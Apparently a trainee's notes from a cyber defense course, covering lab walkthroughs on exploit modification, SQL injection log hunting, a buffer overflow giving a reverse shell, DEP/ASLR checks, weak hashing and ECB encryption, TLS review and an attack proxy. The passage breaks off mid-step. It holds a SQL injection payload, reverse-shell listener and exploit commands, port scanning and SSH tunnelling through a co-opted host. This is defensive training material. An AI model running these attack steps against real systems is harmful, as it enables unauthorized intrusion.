21. Select the Escape key and enter :wq to write the changes and quit Vim.


22. Start the listener again before running the exploit.
(trainee@dmss-kali)-[~] $ nc -nlvp 4444

![image](https://github.com/user-attachments/assets/9bd227b3-0161-4717-be1d-f4d1221993f1)

23. Run the modified exploit script in a different window or tab:
(trainee@dmss-kali)-[~] $ python3 49918.py 199.63.64.51 4444 http://200.200.200.10:8080

![image](https://github.com/user-attachments/assets/4d618cdc-ddb2-4f64-a280-0536c8e8314b)

Once again, the terminal hangs, which is a good sign.


24. Switch over to the terminal that had Netcat running.

![image](https://github.com/user-attachments/assets/1aff7ba7-f741-4d99-a7fb-da5cc48d5d42)

A connection was established from the exploited host.


25. Verify shell functionality with the following command:
whoami

![image](https://github.com/user-attachments/assets/e9bb2e60-b2eb-4d07-a3e3-f310983ecc90)

26. Exit the shell by entering the exit command.


This lab exercise provided the opportunity to find exploits using Exploit-DB and SearchSploit and make minor modifications to an exploit script. These steps are similar to actions attackers undertake when selecting and using an exploit.



----------------------------------------------

Scenario
The mission partner has an internet-facing host. The supported commander wanted to ensure that it was secured against unauthorized external access. The CPT has been tasked to verify that the internet-facing host is secure. Use the provided kali VM to investigate the mission partner's system.

Internet Host: 190.13.1.9
1. Log in to the kali-hunt VM using the provided credentials:

Username: trainee
Password: CyberTraining1!
﻿

![image](https://github.com/user-attachments/assets/5488aed9-65cc-4e8e-a3b8-79592605d845)

![image](https://github.com/user-attachments/assets/623a3334-334c-4881-b6d7-9c0064cecebb)

-----------------------------------------------

![image](https://github.com/user-attachments/assets/54bd0e2f-1fd4-4067-9bc2-9a7a99954128)


![image](https://github.com/user-attachments/assets/5afaf3aa-c0b4-495e-be0c-08d0ad90ba46)


------------------------------------------

![image](https://github.com/user-attachments/assets/4e929b9c-4180-4bb5-925c-5be723c96230)


![image](https://github.com/user-attachments/assets/a7db80a0-5f01-497f-9e1a-73cf45d98991)

-------------------------------------


![image](https://github.com/user-attachments/assets/c5fd3802-af4e-48f1-9b77-eb0fb111a24d)

![image](https://github.com/user-attachments/assets/f5e3192e-14d0-4009-b814-7c9171da243b)

![image](https://github.com/user-attachments/assets/cdea9247-919e-4886-a503-d59c311d85dc)

-----------------------------------

############## CDAH-L3 Web Application Attacks ##############


CDAH-M7L3 Web Application Attacks

 look for union in certain logs

search for UNION+SELECT
![image](https://github.com/user-attachments/assets/0447e933-1ad4-4384-82cc-db9f5592d149)

Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 

also search for script and get time stamp

![image](https://github.com/user-attachments/assets/21dac7be-1a4b-43a2-9f11-b812367e8cbc)


![image](https://github.com/user-attachments/assets/fb413ff3-19b2-4871-b637-4b0c5406cb85)

![image](https://github.com/user-attachments/assets/a9d396e2-226a-489b-a198-6993424be159)



![image](https://github.com/user-attachments/assets/fae52e80-3474-40e9-9636-c0e20490ea1e)


![image](https://github.com/user-attachments/assets/0b048432-e84c-4c85-b6eb-dca6fe9b9567)

![image](https://github.com/user-attachments/assets/5a50dbea-4301-4297-904d-88933600caaf)


![image](https://github.com/user-attachments/assets/874b775c-34ba-48f6-8dbe-786c2a6b402f)

![image](https://github.com/user-attachments/assets/3dd4c9a2-a67f-4a2f-a2bd-449ac9389932)

![image](https://github.com/user-attachments/assets/1bad4db4-39e3-4bc2-985a-dd73231d6a97)

![image](https://github.com/user-attachments/assets/a31ad09d-68e1-41bb-8323-57b0e8034fc4)

SQLI 12:39:14 Attack Query
The following query was executed by the adversary:

'UNION ALL SELECT current_user(),user() #
﻿

NOTE: The use of the ', UNION, and # should immediately tip off the analyst. As demonstrated and discussed throughout the lesson, these characters are used to exploit a web application's design and gain access to otherwise protected information.  

![image](https://github.com/user-attachments/assets/6a87e0ae-bcc7-4d95-b563-a95b1279b3df)

Information Obtained
The SQLI attack on the network helped the adversary gain information about the current database user. This information contains portions of the user's credentials. The credential information obtained may lead the adversary to perform other types of attacks in an attempt to break into the user's account. To mitigate this attack, measures to sanitize input in the network application portal must be enacted. 

--------------------------------------------------
########### CDAH-M7L4 Stack Exploitation ############

Stack Exploitation | Executing a Buffer Overflow
Understanding how a buffer overflow works on a theoretical level is certainly helpful, but experiencing it in action and seeing the power of such an attack can be just as valuable, or more so. The following lab demonstrates the execution of a prepared buffer overflow attack against an intentionally vulnerable program. 

﻿

Workflow

﻿

1. Log in to the win-hunt Virtual Machine (VM) with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Run vulnerable.exe on the desktop.

﻿

NOTE: When prompted to run the software with an unverified publisher, select Run. This is not an advised security practice; however, running this software in a virtual environment demonstrates the risks associated with running software with unknown origins.


![image](https://github.com/user-attachments/assets/3b99d372-14c5-4a90-948d-d0c1ad5831a8)


When the process is running, a terminal window indicates that it is listening for connections.


![image](https://github.com/user-attachments/assets/a1497512-fc6e-4edd-bfd0-81140b776ba7)

3. Log in to the kali-hunt VM using the following credentials:
Username: trainee
Password: CyberTraining1!



4. Open two terminal windows. One of these is used to send input to the vulnerable machine, and one is used to receive a connection when the attack is successful.

![image](https://github.com/user-attachments/assets/e0b0d413-2f75-426e-ae18-f97a91c61004)

5. Test the function of the vulnerable program with the preconfigured test script in the trainee home folder.
(trainee@dmss-kali)-~ $ ./test.py



The vulnerable program is essentially an echo server, in which the program echoes any input received with the greeting Hello, <input>!!

![image](https://github.com/user-attachments/assets/45b31a0f-c77a-4674-9472-e4c209df4697)

Examining the win-hunt VM reveals that the program has received the input and sent a reply.

![image](https://github.com/user-attachments/assets/c5731cfa-deea-49ae-902a-fd323f665abc)

Though the output does not indicate it, an examination of the vulnerable code would reveal that the program-allocated buffer to receive input into and echo back to a client is only 146 bytes long. This buffer is what the prepared attack script overwrites.


6. In kali-hunt, open a Netcat listener on port 5555 in the other terminal window with the following command:
(trainee@dmss-kali)-~ $ nc -lvnp 5555



This allows interaction with the reverse shell when the attack is executed.

![image](https://github.com/user-attachments/assets/708c2868-7a42-4c4d-9dbe-e9395738db2e)

7. In the first terminal window, execute the attack script:
(trainee@dmss-kali)-~ $ ./attack.py

![image](https://github.com/user-attachments/assets/067643ce-d549-498e-ba01-3296a23c23d6)


The data sent to the vulnerable program far overwrites the 146-byte buffer. After 146 bytes of padding, the malicious payload overwrites the original return address of the parent process with the address of a command that jumps to the malicious code, which immediately follows the new return address. Finally, more padding is sent at the end of the payload.


The malicious code sent with this attack first opens an instance of cmd.exe with the current privileges and user context. It then serves that process to the remote kali-hunt host on remote port 5555. If the attacker were listening on a different Internet Protocol (IP) address or a different port, this attack would fail. This is why these types of attacks require such hand-crafted shellcode.


8. Observe the access granted to the win-hunt VM through the Netcat listener. A simple command reveals that this command shell provides remote access to the win-hunt VM under the context of its trainee user.
C:\Users\trainee\Desktop>whoami

![image](https://github.com/user-attachments/assets/108df7b1-e721-4771-822d-b5344896429e)

9. Select CTRL+C in the kali-hunt terminal windows to close the connection. 

----------------------------------------------

Memory Safeguards | Employing DEP as Mitigation
Testing DEP
﻿

Because this protection was not in place during the original exploit, turn DEP on and run the buffer overflow attack again to observe that it effectively prevents the attack from succeeding by halting execution and throwing an error. This illustrates the value of such protections and demonstrates how to check and set the status of DEP on a Windows system. The following lab offers this demonstration by testing the DEP protections on win-hunt when the vulnerable executable is run.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open PowerShell as the administrator, and assess the status of DEP protection with the following command:

PS C:\Windows\system32> BCDEdit /enum "{current}"
﻿
![image](https://github.com/user-attachments/assets/ae51afd9-9b9c-402b-8f45-35419e8e2fdd)


If the value for nx is not OptOut, this is potentially an issue to raise with the network owner. For networks following the Defense Information Systems Agency (DISA) Security Technical Implementation Guides (STIG), this is considered a finding for Windows OSs and should be remedied to be in compliance. 


Alternatively, the Windows Management Instrumentation Command-Line (WMIC) utility can be used to check this system setting:
PS C:\Windows\system32> wmic OS Get DataExecutionPrevention_SupportPolicy  

![image](https://github.com/user-attachments/assets/46afd38b-f21b-40ad-8706-e5759fdf3e90)


Recall that this value, 0, corresponds to the DEP setting AlwaysOff, so the output of these commands is consistent. Because these settings are neither advisable nor consistent with Windows defaults, it is important to know how to restore them to a safer state.


3. Turn DEP back on by running the following command:
PS C:\Windows\system32> BCDEDIT /set "{current}" nx OptOut



NOTE: This sets the system to Level 3, OptOut, which enables DEP for all processes. A system reboot is required before the setting is noticed.


![image](https://github.com/user-attachments/assets/83ba6273-6d7d-4f5e-a9ac-75afd9c7c6de)


4. Restart the win-hunt VM to apply the updated DEP setting, either through the User Interface (UI) or with the following command:
PS C:\Windows\system32> Restart-Computer



5. Upon restart, run vulnerable.exe again.

![image](https://github.com/user-attachments/assets/eaa5f003-9e0b-4816-afa2-53391e2baf64)

6. Log in to the kali-hunt VM using the following credentials:
Username: trainee
Password: CyberTraining1!



7. Open a new Netcat listening process:
(trainee@dmss-kali)-~ $ nc -lvnp 5555



8. Attempt to run the exploit again from Kali:
(trainee@dmss-kali)-~ $ ./attack.py

![image](https://github.com/user-attachments/assets/05eb366c-8163-442e-b48f-51971c506270)

9. Observe that the exploit now fails.

![image](https://github.com/user-attachments/assets/4ff098a1-3662-4b48-9d76-c9415bb12ccb)

Instead of allowing the program to return to an unknown address and execute code on the stack, the OS successfully recognized this behavior as unsafe and closed the process with an error.


Check that this setting is present on remote computers in a domain. 


10. Log in to the Domain Controller (DC) ch-dc1 using the following credentials:
Username: trainee
Password: CyberTraining1!



11. Open PowerShell as the administrator.


12. Check the DEP setting on a domain machine (CH-EXCH2) from the DC:
PS C:\Windows\system32> Invoke-Command -ComputerName ch-exch2 -ScriptBlock {$env:COMPUTERNAME;BCDEdit /enum "{current}"}

![image](https://github.com/user-attachments/assets/01a3530d-1035-44fe-8099-509819dda73b)

This demonstrates that from a domain machine with a domain account that has remote PowerShell privileges, domain machines may easily be inspected at scale for this essential security setting.

------------------------------

Workflow


1. Log in to the win-hunt VM using the following credentials:
Username: trainee
Password: CyberTraining1!



Although no out-of-the-box commands exist to check the ASLR status of a program, some utilities are available from security researchers, such as Get-PESecurity from the producers of PowerSploit. In order to run these custom cmdlets, prepare the PowerShell environment using an administrator PowerShell console.


2. Set the PowerShell execution policy to bypass.
PS C:Windows\system32> Set-ExecutionPolicy bypass -force



This command allows commands to be run without the default execution policies. Generally, this is not wise, but to run the tool in this exercise, it is necessary because the module loaded below is unsigned, and the default policy prevents the loading of unsigned PowerShell modules.


3. Import the custom PowerShell module and its functions.
PS C:Windows\system32> Import-Module .\Get-PESecurity.psm1



The Get-PESecurity module is a custom-built PowerShell library developed by some of the security researchers who also developed the PowerSploit tool. It has been pre-staged in the System32 folder but would normally need to be downloaded for an analyst to employ it while on a mission. 


4. Check the status of the vulnerable program with the PowerSploit cmdlet:
PS C:Windows\system32> Get-PESecurity -file 'C:\Users\trainee\desktop\vulnerable.exe'



Finally, running one of the module's cmdlets on the vulnerable executable reveals that none of the memory protections discussed in this lesson were present in the compiled binary.

![image](https://github.com/user-attachments/assets/59064728-b2f5-4caf-8f95-ca95d2b51bf3)

As expected, this program is not protected by ASLR, which means that each of its memory addresses is at a predictable location.


-------------------------------------------

########### CDAH-M7L5 Stack Exploitation ############

Hashing Scenario

Workflow


1. Log in to the kali-hunt Virtual Machine (VM) using the following credentials:
Username: trainee
Password: CyberTraining1!



The mission partner provided a copy of the script used to create the user and password hashes, which are written in Python.


2. View the following script which defines the methods for generating the password file and the main method:
(trainee@dmss-kali)-[~] $ less -N ~/m2l5/hashing/create_hash.py

![image](https://github.com/user-attachments/assets/1b930854-3f1e-4e7b-8a40-772ff79743cf)

The code has a very straightforward purpose. Looking at the main method, it takes user input and creates a line in the passwd file. In the create_hash() method, the hashing algorithm used is MD5. MD5 is considered a cryptographically insecure algorithm. To be cryptographically secure, a hashing algorithm must meet three requirements:
The algorithm must be preimage-resistant.
The algorithm must be second preimage-resistant.
The algorithm must be collision-resistant.

What does this mean? First, start with the definition of a preimage. A preimage is a set of all the data that results in the same hash.


The MD5 algorithm produces a hash that is 16-bytes/128-bits long. There is an infinite number of possible inputs, but MD5 only has 2^128 possible combinations; some inputs result in the same hash. This phenomenon is known as the pigeonhole principle, which is demonstrated in Figure 7.5-5. This means that within a given hash table size (number of containers), when that size is exceeded, some inputs do not have a unique output (container). These inputs share the same resultant hash as a different input. In other words, if you have more pigeons than containers, more than one pigeon needs to share the same container.


![image](https://github.com/user-attachments/assets/a5da6a5c-9341-440f-a2f0-fdc36d278128)


A preimage-resistant hash means it is very difficult to find a single item in the preimage. In terms of the pigeon example, this can be thought of as not being able to guess where the pigeons plan to roost. This effectively makes the hash irreversible. To be second preimage-resistant, provided there is a single item in the preimage, it is still extremely difficult to find a second item in the preimage. This effectively means that there is no discernable pattern in the preimage items. According to the pigeon example, it would be hard to guess which pigeons roost together.


Collision-resistant states that it is difficult to find any two arbitrary inputs that produce the same hash. Due to a principle known as the birthday paradox, finding any two inputs that result in the same hash should take 2^64 attempts for MD5. However, since MD5 is not collision-resistant, it takes significantly fewer attempts and is doable in a reasonable amount of time. This is why MD5 is known to be cryptographically insecure and should not be used as a cryptographic algorithm. MD5 may still be used for error checking, however, software publishers often publish an MD5 along with their software to enable the user to check for download integrity. Additionally, MD5 may still be used as a Hash-based Message Authentication Code (HMAC) for its usage as a Pseudo-Random Number Generator (PRNG).


Sounds like a lot of complex requirements just to store passwords, right? That's because it is. Never use custom-built hashing algorithms for production usage; even thoroughly vetted algorithms tested and evaluated by expert committees can be found to be insecure years later. Always follow recommended guidelines and practices recommended by the experts.


A recommendation that can be made to the mission partner to improve security is to use a cryptographically secure algorithm to store password hashes. Some cryptographically secure algorithms recommended for storage are Secure Hashing Algorithm (SHA) 2 and SHA3.


3. Execute the following script to see what happens:

(trainee@dmss-kali)-[~] $ python3 ~/m2l5/hashing/create_hash.py

![image](https://github.com/user-attachments/assets/daf3da44-59c5-44ed-acaf-6c410128e144)



The program prompts for a username.


4. Enter test for the username and password when prompted for the password.

![image](https://github.com/user-attachments/assets/0c78e10e-0e41-4a55-a8b6-e5ba371d04f9)

After selecting Enter, the script states that the user has been created successfully.

![image](https://github.com/user-attachments/assets/4547570c-a377-4267-b134-a88f8f9a6100)

The passwd file is created in the current directory.


5. View the contents of the passwd file by running the following command:
(trainee@dmss-kali)-[~] $ cat passwd

![image](https://github.com/user-attachments/assets/2bd3067d-b551-48a6-85c2-378424e51474)

Notice that the username and password are stored in a username:password format. Presumably, this data would be used to authenticate users into other applications.


The mission partners also provided their password file for the CPT's analysis.


6. View their passwd database by running the following command:
(trainee@dmss-kali)-[~] $ less ~/m2l5/resources/passwd

![image](https://github.com/user-attachments/assets/25819e07-1c25-4ffe-8a60-5933045aa422)

Immediately, notice that three users have the same password: lmadison, tbooker, and malexander, as their password hashes all match. Apart from the lack of password complexity issue, which allows users to come up with the same password covered in previous lessons, storing passwords in a manner where the same password generates the same hash is also bad practice. The reason is demonstrated in the next steps.


7. Copy the file hash shared by the three users and navigate to crackstation.net on the workstation to look up the hash.

![image](https://github.com/user-attachments/assets/ae9fcbff-9918-4956-a6b9-9c0c71394741)

There is a match! The password for the three users is monkey. The site used contains a database known as a rainbow table, which is a set of precomputed hashes for a wordlist. Having a rainbow table enables attackers to rapidly conduct a lookup rather than computing the hash of every password in a wordlist. As all hashing algorithms generate the same data every time for the same data, all hashing algorithms are susceptible to rainbow table attacks, even if they are cryptographically secure.


To defeat rainbow table attacks, practice hash salting. A salt is a known value that is added to the user's password before hashing to change to the resulting hash. Ideally, each salt is unique per hash. If the same salt is used, while it probably defeats a rainbow table, users are still using the same password if they are using the same salt because the hash has not changed. Once the salt is calculated — different applications do this differently — it is stored with the password hash.


An example of a rudimentary salt is the username and a timestamp. Try this in the next step.


8. Execute the following command to ensure that the password that the three users share is monkey:

(trainee@dmss-kali)-[~] $ echo -en 'monkey' | md5sum

![image](https://github.com/user-attachments/assets/96c2a8ff-d16e-4c32-814f-8a93a1d14f20)

The hash is the same as in the password database file.


9. Append a salt, one of the usernames and a timestamp, to the password and hash the concatenated string.


NOTE: Single quotes are not needed. They are there to make the different parts appended to the password clearer. monkey is the password portion, lmadison is the username, and the command $(date "+%F_%R") appends a current timestamp. Therefore, the hash generated when executing this command is different.
(trainee@dmss-kali)-[~] $ echo -en 'monkey''lmadison'$(date "+%F_%R") | md5sum

![image](https://github.com/user-attachments/assets/0dc39ab4-b697-41d7-b1f5-ab66b1380358)

The new hash is ea5e08fee66cca7f8d19fe0f98c59e19 in this example. The hash is different.


10. Copy the new hash and attempt another rainbow table attack.

![image](https://github.com/user-attachments/assets/0fa38874-4e90-4534-bdfd-b6bc2d89eb7d)

This time there is no match for the password, despite being an e xtremely weak pa ssword. The salt is stored with the password hash for future use. In this case, the timestamp may be stored in the database in the ACCOUNT_CREATION_TIME field in the same file. When running the hash algorithm again, the username and the ACCOUNT_CREATION_TIME is added to the password before hashing.

---------------------------------------------

Encryption Scenario
Encryption is focused on the confidentiality aspect of the CIA triad, and its function is to scramble the data so that unauthorized individuals cannot read the data being exchanged. Unlike hashing, which is a one-way function, encryption is a two-way function, which means it can be reversed. There are two primary forms of encryption: symmetric and asymmetric. Symmetric encryption uses the same key to encrypt and decrypt, while asymmetric encryption uses one key to encrypt and another key to decrypt. Symmetric encryption is typically used to secure communications, while asymmetric encryption is typically used in Public Key Infrastructure (PKI) to validate the identity of the server or client as well as key exchange. The following scenario examines a custom implementation of a program that uses symmetric encryption.

﻿

Scenario: The mission partner uses a custom application to encrypt sensitive documents sent over the network. However, they noticed information from these documents on open-source business databases. They requested CPT assistance in locating the root of the problem.

﻿

Workflow

﻿

1. Log in to the kali-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. View the following script used by the mission partner to encrypt documents:

(trainee@dmss-kali)-[~] $ less -N ~/m2l5/encryption/file_encryptor.py


![image](https://github.com/user-attachments/assets/fe06851c-b06d-4c97-8d76-307a048dbdcd)

Some of the output is truncated in the screenshot as there are 70 lines. From the imports, it appears that the underlying algorithm in use is Data Encryption Standard (DES). DES is a symmetric block cipher that operates on blocks of data 64 bits in size. While the key length of DES is 8 bytes, it uses one byte for parity so it effectively has a key strength of 56 bits. In the 1970s when DES was developed, no computer could be expected to brute force the algorithm. Now, specialized computers are capable of cracking a DES key in about a day.


Other than brute force, there are attacks that are capable of defeating the DES algorithm such as differential cryptanalysis, linear cryptanalysis, and improved Davies' attack. These attacks are not covered in this course.


NIST now recommends the usage of an Advanced Encryption Standard (AES) if a block cipher is needed, though 3DES is acceptable for use with legacy applications. Like with hashing algorithms, any custom encryption algorithm is a huge red flag and should absolutely not be used to secure sensitive data on Federal systems.


This program has another glaring flaw. In line 23, there is a reference to an Electronic Code Book (ECB) mode. Encryption modes refer to additional operations that can be applied alongside the encryption algorithm itself. If an encryption algorithm is cryptographically secure, then why apply operations to the data? The data is adequately protected, is it not? The answer is no, for similar reasons that hashing algorithms need salts.


ECB encrypts every block the same way. Therefore, if the original text has whitespace or repeats information such as message headers across different messages, that block is the same as well. ECB should never be used because it allows adversaries to see patterns (e.g., headers and footers within text or whitespace in an image, which may allow them to deduce the plaintext despite being encrypted).


3. Execute the following script to view the image using ristretto — a preinstalled image viewer:
ristretto ~/m2l5/resources/secret.bmp &


![image](https://github.com/user-attachments/assets/4d5a240c-32be-4a24-9893-4ee608f3c417)

It is a picture of text reading Super secret text.


4. Encrypt the file by running the following command:
(trainee@dmss-kali)-[~] $ python3 ~/m2l5/encryption/file_encryptor.py ~/m2l5/resources/secret.bmp picture.enc

![image](https://github.com/user-attachments/assets/9ef02fff-adb4-4ebc-aab4-3731f901ce3a)


This encrypts the file and writes the encrypted data to picture.enc using DES in ECB mode.


5. Copy the file header from the unencrypted file to a temporary file:
(trainee@dmss-kali)-[~] $ head -c 54 ~/m2l5/resources/secret.bmp > picture.tmp



6. Copy the encrypted bytes to the temporary picture, omitting where the file header would be:
(trainee@dmss-kali)-[~] $ tail -c +55 picture.enc >> picture.tmp



7. Execute the following script to view the new picture using ristretto:
(trainee@dmss-kali)-[~] $ ristretto picture.tmp &

![image](https://github.com/user-attachments/assets/ba65887e-3094-4487-8216-d1df5450a2d8)

Note that the checkered background is not part of the image, but part of the image viewer.


This is why encrypting everything the exact same way may compromise confidentiality. ECB enables patterns in the underlying data to surface, which may allow adversaries to deduce what the original message was, even without a key. This is a problem regardless of the encryption algorithm used, whether it was DES or AES; therefore, never use ECB as an encryption mode. Another alternative that generates more randomness is Cipher Block Chaining (CBC). CBC mode eXclusive ORs (XOR) an unencrypted block with the previous block and then encrypts the block using the specified algorithm. Since this mode relies on the previous block to compute the current block, an Initialization Vector (IV) is needed for the very first block. CBC has the advantage of a single change to cascade throughout the rest of the data as well, causing even more randomness in the ciphertext.


The following steps change the encryption mode used by the program.


8. Make a copy of the file encryption program.
(trainee@dmss-kali)-[~] $ cp ~/m2l5/encryption/file_encryptor.py ~/m2l5/encryption/file_encryptor.py.bak



9. Run the following command to use CBC mode in the program rather than ECB.
(trainee@dmss-kali)-[~] $ sed -i 's/ECB/CBC/' ~/m2l5/encryption/file_encryptor.py

![image](https://github.com/user-attachments/assets/f0b4a032-1674-4800-8f3f-e23d2631bb01)

The sed command changes lines 23 and 28.


10. Encrypt the file again.
(trainee@dmss-kali)-[~] $ python3 ~/m2l5/encryption/file_encryptor.py ~/m2l5/resources/secret.bmp picture_cbc.enc



11. Copy the header from the unencrypted file and the data from the newly encrypted file.
(trainee@dmss-kali)-[~] $ head -c 54 ~/m2l5/resources/secret.bmp > picture.tmp
(trainee@dmss-kali)-[~] $ tail -c +55 picture_cbc.enc >> picture.tmp



12. Execute the following script to view the file that was encrypted using CBC mode rather than EBC mode.
(trainee@dmss-kali)-[~] $ ristretto picture.tmp &

![image](https://github.com/user-attachments/assets/d6c83bf8-b415-4a83-9ce5-15c5148ee9eb)

Notice that there is no discernible pattern while using CBC. Other modes that are not ECB generate a similar amount of randomness.


------------------------------------------

Detecting Insecure Cryptography over the Network
To establish a secure channel over the internet with no prior knowledge of who the person is, three things are needed:

Key exchange: A method to secure exchange keys.

Bulk encryption algorithm: Encrypts most of the communications.

Message Authentication Code (MAC): A method to verify integrity of the message that is transmitted with the message.

Key exchange functions use asymmetric encryption. Diffie-Hellman (DH) key exchange is a popular method used to exchange keys and can technically be used for PKI, but is usually not, which is why DH does not provide for authentication. RSA is the dominant PKI algorithm in the market, which uses Certificate Authorities (CA) to verify the authenticity of entities on the internet, and can also be used for key exchange. DH and RSA are often used together to authenticate individuals and exchange keys.

﻿

The bulk encryption encrypts most of the communications, which may contain a lot of data. It needs to be fast, which asymmetric encryption is not. Symmetric ciphers are often thousands of times faster than asymmetric algorithms. This is why asymmetric encryption is used to share a symmetric cipher key or a session key. The session key is used with a symmetric encryption algorithm to encrypt the session.

﻿

The MAC ensures that the message was not changed between the sender and receiver. This is where hashes come in; the session key is combined with the data, and then the hash is calculated and transmitted along with the ciphertext. This ensures that only the sender or receiver could have been communicants of the session, as the session key is needed to generate the correct hash. The process described here is actually a hash-based message authentication code or HMAC. There are other methods of generating MACs that are not covered in this lesson.

﻿

These components — asymmetric encryption, symmetric encryption, and hashing — all work together to provide secure communications over the network.

﻿

Transport Layer Security (TLS) is a protocol that secures traffic from prying eyes and handles the implementation of the different types of cryptography. TLS is the successor to Secure Socket Layer (SSL). While originally developed with web browsing in mind, TLS can be used for much more than for HTTP security; it can secure many other protocols as well.

﻿

In the following lab, the transport protocols that secure communications over the network and their underlying cipher-suites using Zeek SSL logs are examined.

﻿

Workflow

﻿

1. Log in to the kali-hunt VM using the provided credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Firefox and browse to the Security Onion page with the bookmark using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

3. After authenticating, navigate to the Kibana Discover page.

﻿

4. Set the following time range:

November 4, 2021 @ 16:00 - November 4, 2021 @ 18:00

﻿![image](https://github.com/user-attachments/assets/6154d063-50ea-45c8-a9e3-4b5ae83c5dbb)

5. Enter the following filter to only view entries related to SSL/TLS.
event.dataset:ssl

![image](https://github.com/user-attachments/assets/6506cddc-12db-4704-b0d8-5d9a543b9a8a)


6. Toggle the following columns:
client.ip
ssl.server_name
ssl.version
ssl.cipher

![image](https://github.com/user-attachments/assets/30d9884d-f1b8-4091-88b9-8d93cf1504a3)

In the ssl.cipher field, notice which cipher suite is used.


Breaking out the cipher suite from the first few results:
The key exchange algorithm is Elliptic Curve Diffie Hellman Exchange (ECDH) and RSA.

![image](https://github.com/user-attachments/assets/49da43c4-f016-4ce1-8521-51076c8e779d)

The bulk encryption mechanism is AES using a 256-bit key and CBC mode.

![image](https://github.com/user-attachments/assets/ee577e5d-3b7f-47f0-a7aa-7477179dffa6)


Message integrity is verified using SHA2-384.

![image](https://github.com/user-attachments/assets/fe6a8ac3-05fa-4c4b-aace-8dd4d3dbef91)

Cipher suites are implemented via SSL/TLS. Notice that the SSL version used for the host ch-smtp.vcch.gov is TLS version 1.2.


A brief history on SSL and the naming convention to prevent future confusion as they are often used interchangeably: Netscape developed the SSL protocol and released the first version in 1995 as SSL version 2 (SSLv2); SSLv1 was never released. In 1996, Netscape released the next version, SSLv3, and turned it over to the Internet Engineering Task Force (IETF). The IETF made minor modifications and released it in 1999 as TLSv1.0. The most recent release is TLSv1.3. In chronological order, the versions of SSL/TLS are as follow:
SSLv2
SSLv3
TLSv1.0
TLSv1.1
TLSv1.2
TLSv1.3

All versions before TLS 1.2 were deprecated due to security vulnerabilities, as specified in the Request For Comments (RFC) 6176, RFC 7568, and RFC 8996. For example, SSLv3 and some implementations of TLS were found to be vulnerable to the Padding Oracle On Downgraded Legacy Encryption (POODLE) attack. The vulnerabilities exist in SSL/TLS, not the underlying cipher suite. To adhere to best security practices, disable TLS versions 1.1 and older on all clients in a network as well as servers hosting webpages.

![image](https://github.com/user-attachments/assets/d7ae478d-9504-407e-ba54-0191dd5b5651)


-------------------------------------------------------

Attacks on Weak Cryptography
A user in the mission partner's network mentioned that they have been a victim of identity theft despite using encryption over the network. The mission partner requested CPT assistance to get to the bottom of the issue. The senior host analyst on the team suspects there may be an issue with weak encryption. Investigate why the client may be experiencing data theft.

User IP address: 192.168.110.130
Workflow

﻿

1. Log in to the kali-hunt VM using the provided credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Firefox and browse to the Security Onion page with the bookmark using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

3. After authenticating, navigate to the Kibana Discover page.

﻿

4. Set the following time range:

November 4, 2021 @ 16:00 - November 4, 2021 @ 18:00

![image](https://github.com/user-attachments/assets/96d33899-d87c-4142-b563-160dfcdb4e57)

Running the following query returns all the information about SSL/TLS sessions that involved the 192.168.110.130 host.
event.dataset:ssl and client.ip:192.168.110.130

![image](https://github.com/user-attachments/assets/b8b56528-2c85-4b9d-a429-e1062614f81a)

More information about the hashing algorithm used by the host can be found in the ssl.ciphers.keyword field. Figure 7.5-29 shows a Lens visualization for the ssl.cipher.keyword field.

![image](https://github.com/user-attachments/assets/dbd41937-e5ad-4fc9-80d9-e0bd06e74753)

he hashing algorithms used were SHA, SHA256, and SHA384. Recall that SHA0 and SHA1 have been deemed insecure and unsuitable for password storage, and both may be referred to as SHA. The possible cipher suites using a hashing algorithm that may be unsuitable for password storage are:
TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
TLS_RSA_WITH_AES_256_CBC_SHA

In this instance, SHA is referencing SHA1.


![image](https://github.com/user-attachments/assets/0c9403cc-462f-4fa2-8dc4-8204dc8dd60e)


------------------------------------------

Investigation | Encryption
The same query and output as before can be used to find the answer to this question.

event.dataset:ssl and client.ip:192.168.110.130

![image](https://github.com/user-attachments/assets/56141984-ccd8-431d-8833-083163161dab)

More information about the encryption used by the host can be found in the ssl.ciphers field.

![image](https://github.com/user-attachments/assets/619d7ad7-49fe-458c-9a1f-59795d5066cc)

From this output, notice:
All sessions used AES.
There were two encryption modes used: CBC and GCM.
The two key sizes used for AES were 128 and 256. The minimum key size recommendation for any block cipher by NIST is 112 bits, though AES does not have an option for a 112-bit key size.

------------------------------------------------

Investigation | Transport Protocols
Recall that the only acceptable versions of SSL/TLS are 1.2 and 1.3. Therefore, the following query returns the correct answer.

event.dataset:ssl and client.ip:192.168.110.130  and not ssl.version:(TLSv13 or TLSv12)
﻿
![image](https://github.com/user-attachments/assets/14068144-a41b-4f24-83cc-d5ac0f93b7f3)


Weak cryptography usage in deprecated versions of TLS/SSL was discovered, which may be contributing to the mission partner's data loss

---------------------------

####### CDAH-M7L6 Credential Stuffing/Password Cracking #######



---------------------------------------------

###### CDAH-M7L7 Using an Attack Proxy #######

Attack Proxy Use

orkflow


1. Log in to the red-kali Virtual Machine (VM) using the following credentials:
Username: trainee
Password: CyberTraining1!



2. From a terminal window, execute a port scan against a device in the mission partner infrastructure. 


In order to save time, only the top 25 ports are scanned. In a live environment, threat actors conduct more extensive reconnaissance to determine all possible points of entry.
(trainee@red-kali)- [~] $ nmap -Pn --top-ports 25 128.0.7.25

![image](https://github.com/user-attachments/assets/d98f3b0e-041a-4203-9b46-c98b70496e48)

The output of this device shows that it is running an SMTP server.

![image](https://github.com/user-attachments/assets/a6b570d3-3a14-4c0f-b946-fb7a079e4da3)


3. Create a dynamic SSH tunnel between the attacker machine and a peer device that has been co-opted for use in this reconnaissance campaign.
(trainee@red-kali)- [~] $ ssh -D 0.0.0.0:9050 -N -f trainee@128.0.7.207



In this SSH command, the following options are used:
